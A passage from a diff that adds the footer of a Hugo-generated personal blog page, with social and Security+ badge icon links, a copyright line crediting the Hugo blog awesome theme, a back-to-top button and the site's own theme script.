+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg>
+</a>
+<a href="https://www.credly.com/badges/60a23b0a-1de8-4d77-9c8b-020de55ad2dc/public_url" target="_blank" rel="noopener noreferrer me"
+    title="Security&#43;">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 Jon K.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+    
+    
+    <script src="http://jon112358.com/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+
+</body>
+</html>
